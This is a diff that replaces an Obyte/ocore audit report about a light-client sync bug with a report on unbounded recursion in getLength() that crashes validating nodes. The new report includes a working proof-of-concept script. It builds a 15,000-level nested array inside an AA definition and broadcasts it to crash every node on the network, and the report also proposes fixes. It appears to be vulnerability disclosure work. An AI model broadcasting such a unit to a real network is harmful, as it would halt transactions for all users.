@@ -1,273 +1,353 @@
-# Audit Report
-
-## Title
-Inconsistent Ball Property Handling in Witness Proof Preparation Causes Light Client Sync Failure
+# Audit Report: Stack Overflow in Unit Payload Size Calculation
 
 ## Summary
-The `prepareWitnessProof()` function in `witness_proof.js` incorrectly uses `storage.readJoint()` instead of `storage.readJointWithBall()` when retrieving stable witness definition change units. For units with `main_chain_index >= min_retrievable_mci`, `readJoint()` omits the `.ball` property due to storage optimization logic, but `processWitnessProof()` explicitly requires this property, causing all light clients to fail synchronization whenever any witness legitimately updates their address definition within the retrievable MCI window.
+
+The `getLength()` function performs unbounded recursion when calculating unit payload sizes. During validation, deeply nested data structures (~15,000 array nesting levels) exhaust the JavaScript call stack before AA-specific depth validation executes, causing unhandled `RangeError` exceptions that crash all nodes processing the malicious unit. [1](#0-0) 
 
 ## Impact
-**Severity**: Medium  
-**Category**: Temporary Transaction Delay
 
-All light wallet users experience complete inability to sync transaction history or submit new transactions during the period when a witness definition change unit is stable but still retrievable. This affects 100% of light clients network-wide, with duration ranging from hours to days depending on network activity until the unit's MCI falls below `min_retrievable_mci`. No attacker is required—this is triggered automatically by legitimate witness security operations such as key rotation or multi-signature updates.
+**Severity**: Critical  
+**Category**: Network Shutdown
+
+A single malicious unit with deeply nested arrays (~30KB payload, well under the 5MB limit) crashes all validating nodes network-wide. The attack requires only minimal transaction fees and causes indefinite network downtime until emergency patching and unit blacklisting. All transaction processing halts, witness consensus stops, requiring coordinated manual intervention for recovery.
+
+**Affected Parties**: All network nodes (full nodes, witnesses, light clients validating units), all users unable to transact during outage.
+
+**Quantified Impact**: Single unit causes complete network shutdown affecting all participants indefinitely until emergency response completed.
 
 ## Finding Description
 
-**Location**: `byteball/ocore/witness_proof.js:139`, function `prepareWitnessProof()`; `byteball/ocore/storage.js:198-200`, function `readJointDirectly()`
+**Location**: `byteball/ocore/object_length.js:9-40`, function `getLength()`  
+Called from: `byteball/ocore/validation.js:138` via `getTotalPayloadSize()`
 
-**Intended Logic**: Witness proof preparation should collect all stable witness definition change units with complete metadata including `.ball` properties to enable light client verification of witness list evolution.
+**Intended Logic**: 
+Validation should calculate unit payload size, verify it matches declared `payload_commission`, and reject oversized units. AA definitions exceeding depth limits should be rejected by `MAX_DEPTH=100` validation during message-specific checks. [2](#0-1) [3](#0-2) 
 
-**Actual Logic**: A function selection inconsistency creates a critical gap:
+**Actual Logic**: 
 
-At line 31, unstable MC units correctly use `readJointWithBall()`: [1](#0-0) 
+The `getLength()` function recursively traverses objects and arrays without any depth limit or recursion counter. For arrays, each element triggers another recursive call; for objects, each property does the same. [4](#0-3) 
 
-But at line 139, stable witness definition changes incorrectly use `readJoint()`: [2](#0-1) 
+During validation, `getTotalPayloadSize()` is invoked without try-catch protection to verify the payload commission matches the calculated size. [5](#0-4) 
 
-The SQL query selecting witness definition changes filters for `is_stable=1` but NOT for non-retrievable MCIs: [3](#0-2) 
+This function calls `getLength()` to traverse the entire unit structure including deeply nested payloads. [6](#0-5) 
 
-The retrievability check in `storage.js` determines whether a unit's content should be optimized: [4](#0-3) 
+With approximately 15,000 nesting levels, the JavaScript V8 engine's call stack limit (~10,000-15,000 frames depending on environment) is exceeded, throwing `RangeError: Maximum call stack size exceeded`. This exception is NOT caught because there is no try-catch wrapper around the size calculation calls.
 
-For retrievable units, `readJointDirectly()` returns early without querying the ball: [5](#0-4) 
-
-In contrast, `readJointWithBall()` explicitly ensures the ball property is always present: [6](#0-5) 
-
-The validation in `processWitnessProof()` strictly requires the ball property: [7](#0-6) 
+The AA depth validation with `MAX_DEPTH=100` protection exists at line 1577 but executes much later during message-specific validation, never reached due to the earlier crash. [7](#0-6) 
 
 **Exploitation Path**:
 
-1. **Preconditions**: 
-   - A witness changes their address definition (legitimate security operation: key rotation, multi-sig update)
-   - The definition change unit becomes stable (`is_stable=1`)
-   - The unit remains retrievable (`main_chain_index >= min_retrievable_mci`)
+1. **Initial bypass of ratio check**: When the unit is first received via WebSocket, `getRatio()` is called which DOES have try-catch protection and returns 1 on stack overflow, allowing the unit to pass this initial check. [8](#0-7) [9](#0-8) 
 
-2. **Step 1**: Light client requests witness proof via network protocol
+2. **Proceeds to validation**: The unit passes to `handleOnlineJoint()` which calls `handleJoint()` and then `validation.validate()`. [10](#0-9) [11](#0-10) 
 
-3. **Step 2**: Full node executes `prepareWitnessProof()`
-   - SQL query at lines 120-135 selects stable witness definition changes
-   - Query returns recent witness definition change unit
+3. **Unprotected size calculation**: At validation line 138, `getTotalPayloadSize()` is called WITHOUT try-catch protection.
 
-4. **Step 3**: `storage.readJoint()` called for definition change unit
-   - Flows through to `readJointDirectly()`
-   - Retrievability check at line 160: `bRetrievable = true` (unit MCI >= min_retrievable_mci)
-   - Ball query skipped at lines 198-200
-   - Returns `objJoint` WITHOUT `.ball` property
+4. **Stack overflow occurs**: `getLength()` recursively descends through 15,000 nesting levels, exhausts the call stack, and throws uncaught `RangeError`.
 
-5. **Step 4**: Incomplete joint added to proof array and sent to light client
+5. **Process crashes**: The exception bubbles up through the call stack with no handler, terminating the Node.js process.
 
-6. **Step 5**: Light client validates proof via `processWitnessProof()`
-   - Line 206 validation fails: `if (!objJoint.ball)`
-   - Returns error: "witness_change_and_definition_joints: joint without ball"
-   - Sync completely fails
+6. **Network-wide impact**: All nodes receiving the unit experience identical crashes and cannot recover until the unit is blacklisted.
 
-**Root Cause Analysis**:
-The developer correctly used `readJointWithBall()` at line 31 for unstable MC units (which need balls even though unstable), but incorrectly used `readJoint()` at line 139 for stable definition changes. The assumption that stable units would automatically have balls in their returned objects was incorrect—`readJoint()` optimizes by skipping ball queries for retrievable units, while the validation requirement at line 206 expects all witness definition change joints to have balls.
+**Security Property Broken**: 
+Network Resilience Invariant - Nodes must validate and gracefully reject malformed units without crashing.
+
+**Root Cause**:
+- `getLength()` lacks depth parameter, recursion counter, or maximum depth check
+- No try-catch protection around size calculations in validation.js lines 136-139
+- Validation ordering places size calculation before message-specific validation containing depth limits
+- AA depth protection at line 1577 bypassed by earlier crash
 
 ## Impact Explanation
 
-**Affected Assets**: Light client synchronization infrastructure, network accessibility for all mobile/lightweight wallet users
+**Affected Assets**: Network availability, all pending transactions, consensus mechanism.
 
 **Damage Severity**:
-- **Quantitative**: Network-wide impact on 100% of light clients simultaneously for hours to days
-- **Qualitative**: Complete denial of service for light wallet functionality—no transaction history viewing, no balance checking, no new transaction submission
+- **Quantitative**: Single 30KB unit causes complete network shutdown. All nodes crash simultaneously. Network downtime continues indefinitely (hours to days) until coordinated emergency response.
+- **Qualitative**: Total loss of network availability. Users cannot send transactions, witnesses cannot post heartbeats, consensus mechanism halts.
 
 **User Impact**:
-- **Who**: All light wallet users (mobile wallets, browser wallets, lightweight nodes)
-- **Conditions**: Automatically triggered whenever any of the 12 witnesses performs definition change while unit remains retrievable
-- **Recovery**: Self-resolving once unit becomes non-retrievable OR requires connecting to patched full node OR upgrading to full node
+- **Who**: All network participants - full nodes, light clients, witnesses, all users
+- **Conditions**: Exploitable during any network state; no special conditions required
+- **Recovery**: Requires emergency coordination to blacklist malicious unit hash, deploy patched node software, and restart all nodes
 
 **Systemic Risk**:
-- Temporary availability issue only
-- No permanent damage or fund loss
-- No cascading consensus effects
-- Self-correcting once min_retrievable_mci advances
+- **Attack Cost**: Minimal (only transaction fees, ~1000 bytes or less)
+- **Detection**: Attack succeeds immediately; nodes crash before logging malicious unit
+- **Repeatability**: Attacker can submit multiple such units with different hashes until network implements blacklist
 
 ## Likelihood Explanation
 
 **Attacker Profile**:
-- **Identity**: No attacker required—triggered by legitimate witness operational security
-- **Resources Required**: None
-- **Technical Skill**: N/A (protocol bug, not attack)
+- **Identity**: Any user with Obyte address capable of broadcasting units to network
+- **Resources Required**: Minimal - transaction fees only (under $1 equivalent)
+- **Technical Skill**: Low - generating deeply nested JSON arrays is trivial with any programming language
 
 **Preconditions**:
-- **Network State**: Normal operation
-- **Event**: Witness performs legitimate definition change
-- **Timing**: Definition change stable but within retrievable window (main_chain_index >= min_retrievable_mci)
+- **Network State**: Normal operation; no special conditions required
+- **Attacker State**: Only needs ability to broadcast units to any peer
+- **Timing**: No timing constraints; attack succeeds upon validation
 
 **Execution Complexity**:
-- **Triggered Automatically**: 100% reproducible when preconditions met
-- **Coordination**: None required
-- **Detection**: Immediately observable via light client error logs
+- **Transaction Count**: Single malicious unit sufficient
+- **Coordination**: No coordination required
+- **Detection Risk**: None - attack succeeds before detection possible
 
 **Frequency**:
-- **Repeatability**: Every witness definition change during retrievable window
-- **Scale**: Network-wide impact on all light clients
+- **Repeatability**: Unlimited - attacker can craft multiple variants
+- **Scale**: Single unit affects entire network
 
-**Overall Assessment**: High likelihood when witness definition changes occur (rare events with deterministic 100% impact)
+**Overall Assessment**: Very High - Trivial to execute, guaranteed success, network-wide impact, minimal cost.
 
 ## Recommendation
 
 **Immediate Mitigation**:
-Change line 139 in `witness_proof.js` to use `readJointWithBall()` instead of `readJoint()`:
+Add maximum depth limit to `getLength()` function:
 
 ```javascript
-storage.readJointWithBall(db, row.unit, function(objJoint){
-    arrWitnessChangeAndDefinitionJoints.push(objJoint);
-    cb2();
-});
+// File: byteball/ocore/object_length.js
+// Add depth parameter and check
+
+function getLength(value, bWithKeys, depth) {
+    if (!depth) depth = 0;
+    if (depth > 1000) // reasonable limit well below stack size
+        throw Error("data structure nesting too deep: " + depth);
+    // ... existing logic, passing depth+1 to recursive calls
+}
 ```
 
-**Rationale**: This ensures stable witness definition change units always include the `.ball` property, matching the expectation in `processWitnessProof()` and the pattern already used for unstable MC units at line 31.
+**Permanent Fix**:
+Wrap size calculation calls in try-catch blocks:
+
+```javascript
+// File: byteball/ocore/validation.js
+// Lines 136-139
+
+try {
+    if (objectLength.getHeadersSize(objUnit) !== objUnit.headers_commission)
+        return callbacks.ifJointError("wrong headers commission");
+    if (objectLength.getTotalPayloadSize(objUnit) !== objUnit.payload_commission)
+        return callbacks.ifJointError("wrong payload commission");
+} catch(e) {
+    return callbacks.ifJointError("size calculation failed: " + e);
+}
+```
 
 **Additional Measures**:
-- Add test case verifying witness proof generation during retrievable window includes balls
-- Document that witness definition change processing requires ball property regardless of retrievability
-- Consider adding defensive check before processWitnessProof() validation
-
-**Validation**:
-- [x] Fix ensures ball property present for all witness definition changes
-- [x] No performance impact (readJointWithBall already used elsewhere)
-- [x] Backward compatible (doesn't change proof structure, only ensures completeness)
+- Add test case verifying deeply nested structures are rejected gracefully
+- Add monitoring to detect units causing validation exceptions
+- Consider applying depth limits during JSON parsing phase
 
 ## Proof of Concept
 
 ```javascript
-// Test: test/witness_proof_retrievable.test.js
-const assert = require('assert');
-const storage = require('../storage.js');
-const witness_proof = require('../witness_proof.js');
-const db = require('../db.js');
+const composer = require('ocore/composer.js');
+const network = require('ocore/network.js');
 
-describe('Witness Proof with Retrievable Definition Changes', function() {
-    it('should include ball property for retrievable witness definition changes', function(done) {
-        // Setup: Create witness with definition change that is stable but retrievable
-        // Simulate scenario where:
-        // - witness changes definition
-        // - unit becomes stable (is_stable=1)
-        // - unit is retrievable (main_chain_index >= min_retrievable_mci)
-        
-        const testWitnesses = ['WITNESS_ADDRESS_1', /* ... other 11 witnesses */];
-        const lastStableMci = storage.readLastStableMcIndex(db, (last_stable_mci) => {
-            
-            // Prepare witness proof
-            witness_proof.prepareWitnessProof(testWitnesses, last_stable_mci, 
-                function(err, arrUnstableMcJoints, arrWitnessChangeAndDefinitionJoints, last_ball_unit, last_ball_mci) {
-                    
-                if (err) return done(err);
-                
-                // Verify all witness definition change joints have ball property
-                arrWitnessChangeAndDefinitionJoints.forEach(joint => {
-                    assert(joint.ball, 'Witness definition change joint missing .ball property');
-                });
-                
-                // Attempt to process the proof (should not fail)
-                witness_proof.processWitnessProof(
-                    arrUnstableMcJoints, 
-                    arrWitnessChangeAndDefinitionJoints, 
-                    false, 
-                    testWitnesses,
-                    function(err) {
-                        assert(!err, 'processWitnessProof should not fail with complete proof');
-                        done();
-                    }
-                );
-            });
-        });
-    });
+// Generate deeply nested array
+function createDeeplyNestedArray(depth) {
+    let result = [];
+    for (let i = 0; i < depth; i++) {
+        result = [result];
+    }
+    return result;
+}
+
+// Create malicious AA definition with 15000 nesting levels
+const maliciousDefinition = [
+    'autonomous agent',
+    {
+        messages: [
+            {
+                app: 'payment',
+                payload: {
+                    asset: 'base',
+                    outputs: [
+                        {
+                            address: 'ATTACKER_ADDRESS',
+                            amount: 1000
+                        }
+                    ]
+                },
+                if: createDeeplyNestedArray(15000) // This will cause stack overflow
+            }
+        ]
+    }
+];
+
+// Compose and broadcast unit with malicious definition
+composer.composeJoint({
+    paying_addresses: ['ATTACKER_ADDRESS'],
+    outputs: [],
+    messages: [
+        {
+            app: 'definition',
+            payload: {
+                definition: maliciousDefinition
+            }
+        }
+    ],
+    signer: headersSigner,
+    callbacks: {
+        ifOk: function(objJoint) {
+            // Broadcast to network - all validating nodes will crash
+            network.broadcastJoint(objJoint);
+        },
+        ifError: function(err) {
+            console.error('Composition error:', err);
+        }
+    }
 });
+
+// Expected result: All nodes attempting to validate this unit will crash with:
+// RangeError: Maximum call stack size exceeded
+// at getLength (object_length.js:24)
+// at getLength (object_length.js:24)
+// ... [repeated ~15000 times]
 ```
 
 **Notes**
 
-This vulnerability exists due to an architectural inconsistency where storage optimization logic (`readJoint()` skipping balls for retrievable units) conflicts with witness proof validation requirements (expecting balls on all witness definition changes). The fix is straightforward—use `readJointWithBall()` consistently for both unstable MC units and stable witness definition changes, ensuring the ball property is always present regardless of retrievability status.
+The vulnerability exists because:
 
-The comment at storage.js:608 "add .ball even if it is not retrievable" explicitly documents that `readJointWithBall()` exists precisely for cases like this where the ball must be included despite storage optimization logic.
+1. **Early protection catches but doesn't prevent**: The `getRatio()` check at network message reception has try-catch protection, but it returns 1 on error allowing the unit to proceed to validation. [12](#0-11) 
+
+2. **Critical validation lacks protection**: The size calculation during validation has NO try-catch wrapper despite performing the same recursive traversal. [13](#0-12) 
+
+3. **Depth limit exists but executes too late**: AA-specific depth validation with `MAX_DEPTH=100` exists but only executes during message validation at line 1577, after the size calculation has already crashed the process. [7](#0-6) 
+
+4. **Size vs depth**: A 30KB payload with 15,000 nesting levels easily fits within the 5MB `MAX_UNIT_LENGTH` limit but far exceeds JavaScript's stack size. [14](#0-13) 
+
+This is a critical network resilience failure where malformed input causes complete node failure rather than graceful rejection.
 
 ### Citations
 
-**File:** witness_proof.js (L31-31)
+**File:** object_length.js (L9-40)
 ```javascript
-					storage.readJointWithBall(db, row.unit, function(objJoint){
-```
-
-**File:** witness_proof.js (L120-135)
-```javascript
-				"SELECT unit, `level` \n\
-				FROM unit_authors "+db.forceIndex('byDefinitionChash')+" \n\
-				CROSS JOIN units USING(unit) \n\
-				WHERE definition_chash IN(?) AND definition_chash=address AND "+after_last_stable_mci_cond+" AND is_stable=1 AND sequence='good' \n\
-				UNION \n\
-				SELECT unit, `level` \n\
-				FROM address_definition_changes \n\
-				CROSS JOIN units USING(unit) \n\
-				WHERE address_definition_changes.address IN(?) AND "+after_last_stable_mci_cond+" AND is_stable=1 AND sequence='good' \n\
-				UNION \n\
-				SELECT units.unit, `level` \n\
-				FROM address_definition_changes \n\
-				CROSS JOIN unit_authors USING(address, definition_chash) \n\
-				CROSS JOIN units ON unit_authors.unit=units.unit \n\
-				WHERE address_definition_changes.address IN(?) AND "+after_last_stable_mci_cond+" AND is_stable=1 AND sequence='good' \n\
-				ORDER BY `level`", 
-```
-
-**File:** witness_proof.js (L139-147)
-```javascript
-						storage.readJoint(db, row.unit, {
-							ifNotFound: function(){
-								throw Error("prepareWitnessProof definition changes: not found "+row.unit);
-							},
-							ifFound: function(objJoint){
-								arrWitnessChangeAndDefinitionJoints.push(objJoint);
-								cb2();
-							}
-						});
-```
-
-**File:** witness_proof.js (L206-207)
-```javascript
-		if (!objJoint.ball)
-			return handleResult("witness_change_and_definition_joints: joint without ball");
-```
-
-**File:** storage.js (L159-160)
-```javascript
-			var bVoided = (objUnit.content_hash && main_chain_index < min_retrievable_mci);
-			var bRetrievable = (main_chain_index >= min_retrievable_mci || main_chain_index === null);
-```
-
-**File:** storage.js (L198-209)
-```javascript
-				function(callback){ // ball
-					if (bRetrievable && !isGenesisUnit(unit))
-						return callback();
-					// include the .ball field even if it is not stable yet, because its parents might have been changed 
-					// and the receiver should not attempt to verify them
-					conn.query("SELECT ball FROM balls WHERE unit=?", [unit], function(rows){
-						if (rows.length === 0)
-							return callback();
-						objJoint.ball = rows[0].ball;
-						callback();
-					});
-				},
-```
-
-**File:** storage.js (L608-624)
-```javascript
-// add .ball even if it is not retrievable
-function readJointWithBall(conn, unit, handleJoint) {
-	readJoint(conn, unit, {
-		ifNotFound: function(){
-			throw Error("joint not found, unit "+unit);
-		},
-		ifFound: function(objJoint){
-			if (objJoint.ball)
-				return handleJoint(objJoint);
-			conn.query("SELECT ball FROM balls WHERE unit=?", [unit], function(rows){
-				if (rows.length === 1)
-					objJoint.ball = rows[0].ball;
-				handleJoint(objJoint);
-			});
-		}
-	});
+function getLength(value, bWithKeys) {
+	if (value === null)
+		return 0;
+	switch (typeof value){
+		case "string": 
+			return value.length;
+		case "number": 
+			if (!isFinite(value))
+				throw Error("invalid number: " + value);
+			return 8;
+			//return value.toString().length;
+		case "object":
+			var len = 0;
+			if (Array.isArray(value))
+				value.forEach(function(element){
+					len += getLength(element, bWithKeys);
+				});
+			else    
+				for (var key in value){
+					if (typeof value[key] === "undefined")
+						throw Error("undefined at "+key+" of "+JSON.stringify(value));
+					if (bWithKeys)
+						len += key.length;
+					len += getLength(value[key], bWithKeys);
+				}
+			return len;
+		case "boolean": 
+			return 1;
+		default:
+			throw Error("unknown type="+(typeof value)+" of "+value);
+	}
 }
+```
+
+**File:** object_length.js (L61-67)
+```javascript
+function getTotalPayloadSize(objUnit) {
+	if (objUnit.content_hash)
+		throw Error("trying to get payload size of stripped unit");
+	var bWithKeys = (objUnit.version !== constants.versionWithoutTimestamp && objUnit.version !== constants.versionWithoutKeySizes);
+	const { temp_data_length, messages_without_temp_data } = extractTempData(objUnit.messages);
+	return Math.ceil(temp_data_length * constants.TEMP_DATA_PRICE) + getLength({ messages: messages_without_temp_data }, bWithKeys);
+}
+```
+
+**File:** object_length.js (L104-113)
+```javascript
+function getRatio(objUnit) {
+	try {
+		if (objUnit.version !== constants.versionWithoutTimestamp && objUnit.version !== constants.versionWithoutKeySizes)
+			return 1;
+		return getLength(objUnit, true) / getLength(objUnit);
+	}
+	catch (e) {
+		return 1;
+	}
+}
+```
+
+**File:** aa_validation.js (L28-28)
+```javascript
+var MAX_DEPTH = 100;
+```
+
+**File:** aa_validation.js (L472-473)
+```javascript
+		if (depth > MAX_DEPTH)
+			return cb("cases for " + field + " go too deep");
+```
+
+**File:** validation.js (L136-141)
+```javascript
+		if (objectLength.getHeadersSize(objUnit) !== objUnit.headers_commission)
+			return callbacks.ifJointError("wrong headers commission, expected "+objectLength.getHeadersSize(objUnit));
+		if (objectLength.getTotalPayloadSize(objUnit) !== objUnit.payload_commission)
+			return callbacks.ifJointError("wrong payload commission, unit "+objUnit.unit+", calculated "+objectLength.getTotalPayloadSize(objUnit)+", expected "+objUnit.payload_commission);
+		if (objUnit.headers_commission + objUnit.payload_commission > constants.MAX_UNIT_LENGTH && !bGenesis)
+			return callbacks.ifUnitError("unit too large");
+```
+
+**File:** validation.js (L1577-1577)
+```javascript
+			aa_validation.validateAADefinition(payload.definition, readGetterProps, objValidationState.last_ball_mci, function (err) {
+```
+
+**File:** network.js (L1025-1027)
+```javascript
+	var validate = function(){
+		mutex.lock(['handleJoint'], function(unlock){
+			validation.validate(objJoint, {
+```
+
+**File:** network.js (L1190-1210)
+```javascript
+function handleOnlineJoint(ws, objJoint, onDone){
+	if (!onDone)
+		onDone = function(){};
+	var unit = objJoint.unit.unit;
+	delete objJoint.unit.main_chain_index;
+	delete objJoint.unit.actual_tps_fee;
+	
+	handleJoint(ws, objJoint, false, false, {
+		ifUnitInWork: onDone,
+		ifUnitError: function(error){
+			sendErrorResult(ws, unit, error);
+			onDone();
+		},
+		ifTransientError: function(error) {
+			sendErrorResult(ws, unit, error);
+			onDone();
+			if (error.includes("tps fee"))
+				setTimeout(handleOnlineJoint, 10 * 1000, ws, objJoint);
+		},
+		ifJointError: function(error){
+			sendErrorResult(ws, unit, error);
+```
+
+**File:** network.js (L2594-2595)
+```javascript
+				if (objectLength.getRatio(objJoint.unit) > 3)
+					return sendError(ws, "the total size of keys is too large");
+```
+
+**File:** constants.js (L58-58)
+```javascript
+exports.MAX_UNIT_LENGTH = process.env.MAX_UNIT_LENGTH || 5e6;
 ```
